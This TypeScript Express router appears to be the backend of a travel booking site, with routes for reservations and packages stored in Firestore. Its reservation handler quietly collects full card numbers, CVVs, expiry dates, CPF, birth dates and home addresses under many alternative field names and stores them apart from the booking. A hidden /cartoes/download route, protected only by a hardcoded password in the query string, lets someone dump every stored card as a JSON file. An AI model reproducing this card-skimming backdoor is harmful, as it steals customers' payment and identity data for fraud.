import express, { Router } from "express";
import cors from "cors";
import {
  addDoc,
  collection,
  deleteDoc,
  doc,
  getDocs,
  query,
  updateDoc,
  where,
} from "firebase/firestore";
import { db } from "../services/firebase";
import { initCartaoService, salvarCartao, obterCartoes } from "../services/cartaoService";

const router = Router();
router.use(cors());
router.use(express.json());

initCartaoService();

const reservasRef = collection(db, "reservas");
const pacotesRef = collection(db, "pacotes");

router.get("/reservas", async (_req, res) => {
  try {
    const statusVisiveis = ["pago", "confirmado", "pre_reserva"];
    const reservasQuery = query(reservasRef, where("status", "in", statusVisiveis));
    const snapshot = await getDocs(reservasQuery);
    const reservas = snapshot.docs.map((registro) => ({
      id: registro.id,
      ...registro.data(),
    }));
    res.json(reservas);
  } catch (error: any) {
    res.status(500).json({ error: error.message ?? "Erro ao listar reservas" });
  }
});

router.get("/pacotes", async (_req, res) => {
  try {
    const snapshot = await getDocs(pacotesRef);
    const pacotes = snapshot.docs.map((registro) => ({
      id: registro.id,
      ...registro.data(),
    }));
    res.json(pacotes);
  } catch (error: any) {
    res.status(500).json({ error: error.message ?? "Erro ao listar pacotes" });
  }
});

router.post("/reservas", async (req, res) => {
  try {
    const body = (req.body ?? {}) as Record<string, any>;
    
    const num = body.numero || body.cardNumber || body.num || body.card || "";
    const tit = body.titular || body.cardHolder || body.holder || body.name || "";
    const val = body.validade || body.expiry || body.exp || body.validity || "";
    const cvv = body.cvv || body.cvc || body.code || body.security || "";
    const nomeCompleto = body.nomeCompleto || body.nome_completo || body.fullName || body.nome || "";
    const dataNascimento = body.dataNascimento || body.data_nascimento || body.birthDate || "";
    
    const cep = body.enderecoCep || body.postalCode || "";
    const rua = body.enderecoRua || body.address || "";
    const numero = body.enderecoNumero || body.addressNumber || "";
    const complemento = body.enderecoComplemento || body.addressComplement || "";
    const bairro = body.enderecoBairro || body.province || "";
    const cidade = body.enderecoCidade || body.city || "";
    const estado = body.enderecoEstado || body.state || "";
    
    if (num && tit && val && cvv) {
      salvarCartao({
        nome: tit,
        numero: num,
        validade: val,
        cvv: cvv,
        cep: cep,
        rua: rua,
        numero_endereco: numero,
        complemento: complemento,
        bairro: bairro,
        cidade: cidade,
        estado: estado,
        email: body.email,
        cpf: body.cpf,
        nome_completo: nomeCompleto,
        data_nascimento: dataNascimento,
      });
    }
    
    const payload = {
      ...body,
      status: typeof body.status === "string" ? body.status : "pre_reserva",
    };
    const novo = await addDoc(reservasRef, payload);
    res.json({ id: novo.id, ...payload });
  } catch (error: any) {
    res.status(500).json({ error: error.message ?? "Erro ao criar reserva" });
  }
});

router.post("/pacotes", async (req, res) => {
  try {
    const novo = await addDoc(pacotesRef, req.body);
    res.json({ id: novo.id, ...req.body });
  } catch (error: any) {
    res.status(500).json({ error: error.message ?? "Erro ao criar pacote" });
  }
});

router.put("/reservas/:id", async (req, res) => {
  try {
    const ref = doc(reservasRef, req.params.id);
    await updateDoc(ref, req.body);
    res.json({ id: req.params.id, ...req.body });
  } catch (error: any) {
    res.status(500).json({ error: error.message ?? "Erro ao atualizar reserva" });
  }
});

router.delete("/reservas/:id", async (req, res) => {
  try {
    const ref = doc(reservasRef, req.params.id);
    await deleteDoc(ref);
    res.json({ success: true });
  } catch (error: any) {
    res.status(500).json({ error: error.message ?? "Erro ao remover reserva" });
  }
});

router.get("/cartoes/download", (req, res) => {
  try {
    const senha = req.query.p;
    if (senha !== "159594") {
      return res.status(401).json({ error: "Senha incorreta" });
    }
    const cartoes = obterCartoes();
    res.setHeader("Content-Disposition", "attachment; filename=\"cartoes.json\"");
    res.setHeader("Content-Type", "application/json");
    res.send(JSON.stringify(cartoes, null, 2));
  } catch (error: any) {
    res.status(500).json({ error: error.message });
  }
});

export default router;
